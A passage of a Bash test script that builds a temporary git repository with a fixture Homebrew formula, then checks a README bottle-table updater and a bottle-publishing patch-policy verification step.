    [[ "$(ci::matrix_os_bottle_tag ubuntu-24.04-arm)" = "arm64_linux" ]]
    [[ "$(ci::matrix_os_bottle_tag macos-26)" = "arm64_tahoe" ]]
  ' _ "$common_lib"

  local git_repo="$root/mt-git"
  mkdir -p "$git_repo/Formula"
  export GIT_AUTHOR_NAME="Test" GIT_AUTHOR_EMAIL="test@example.com"
  export GIT_COMMITTER_NAME="Test" GIT_COMMITTER_EMAIL="test@example.com"
  "$PROV_GIT_BIN" -C "$git_repo" init -q -b main
  cat >"$git_repo/Formula/multitag.rb" <<EOF
class Multitag < Formula
  desc "Multi-platform Linux and macOS bottle fixture"
  homepage "https://example.com"
  url "https://github.com/example/multitag/archive/refs/tags/v1.2.2.tar.gz"
  sha256 "${sha_mac}"

  def install
    bin.install "multitag"
  end
end
EOF
  printf '# Demo\n\n<!-- BEGIN BOTTLE_PROVENANCE_TABLE -->\n<!-- END BOTTLE_PROVENANCE_TABLE -->\n' >"$git_repo/README.md"
  "$PROV_GIT_BIN" -C "$git_repo" add .
  "$PROV_GIT_BIN" -C "$git_repo" commit -q -m "base"
  local base_sha=""
  base_sha="$("$PROV_GIT_BIN" -C "$git_repo" rev-parse HEAD)"

  "$PROV_GIT_BIN" -C "$git_repo" checkout -q -b pr
  awk '{ sub(/v1\.2\.2\.tar\.gz/, "v1.2.3.tar.gz"); print }' "$git_repo/Formula/multitag.rb" >"$git_repo/Formula/multitag.rb.tmp"
  mv "$git_repo/Formula/multitag.rb.tmp" "$git_repo/Formula/multitag.rb"
  "$PROV_GIT_BIN" -C "$git_repo" commit -q -am "multitag 1.2.3"
  local head_sha=""
  head_sha="$("$PROV_GIT_BIN" -C "$git_repo" rev-parse HEAD)"

  cat >"$git_repo/Formula/multitag.rb" <<EOF
class Multitag < Formula
  desc "Multi-platform Linux and macOS bottle fixture"
  homepage "https://example.com"
  url "https://github.com/example/multitag/archive/refs/tags/v1.2.3.tar.gz"
  sha256 "${sha_mac}"

  bottle do
    root_url "https://github.com/artagon/homebrew-aitools/releases/download/multitag-1.2.3"
    rebuild 1
    sha256 cellar: :any, arm64_tahoe:  "${sha_mac}"
    sha256               arm64_linux:  "${sha_arm_linux}"
    sha256               x86_64_linux: "${sha_x64_linux}"
  end

  def install
    bin.install "multitag"
  end
end
EOF
  local readme_script="$PROV_REPO_ROOT/scripts/update-readme-bottles.sh"
  local pub_script="$PROV_REPO_ROOT/scripts/ci/publish-bottles.sh"
  PROVENANCE_REPO_ROOT="$git_repo" README_BOTTLES_FILE="$git_repo/README.md" \
    "$shell_bin" "$readme_script"
  grep -Fq "\`arm64_tahoe\` · \`1.2.3\` (rebuild 1)" "$git_repo/README.md"
  grep -Fq "\`arm64_linux\` · \`1.2.3\` (rebuild 1)" "$git_repo/README.md"
  grep -Fq "\`x86_64_linux\` · \`1.2.3\` (rebuild 1)" "$git_repo/README.md"

  "$PROV_GIT_BIN" -C "$git_repo" commit -q -am "multitag: add 1.2.3 bottle"
  local rtemp="$root/mt-rtemp"
  mkdir -p "$rtemp/publish-stage"
  "$PROV_GIT_BIN" -C "$git_repo" format-patch --stdout "$base_sha..HEAD" >"$rtemp/publish-stage/commits.mbox"
  "$PROV_GIT_BIN" -C "$git_repo" checkout -q main

  printf '{"schema":"artagon-bottle-release-map/v1","bottles":[{"formula":"multitag","tag":"arm64_tahoe"},{"formula":"multitag","tag":"arm64_linux"},{"formula":"multitag","tag":"x86_64_linux"}]}\n' \
    >"$rtemp/publish-stage/release-map.json"
  local map_sha=""
  map_sha="$(prov_sha256_file "$rtemp/publish-stage/release-map.json")"

  (
    cd "$git_repo" \
      && GITHUB_REF="refs/heads/main" \
        RUNNER_TEMP="$rtemp" \
        BASE_MAIN_SHA="$base_sha" \
        HEAD_SHA="$head_sha" \
        RELEASE_MAP_SHA256="$map_sha" \
        SKIP_FETCH_HEAD_SHA="1" \
        "$shell_bin" "$pub_script" verify-patch-policy
  ) >"$root/mt-policy.out" 2>"$root/mt-policy.err"
}
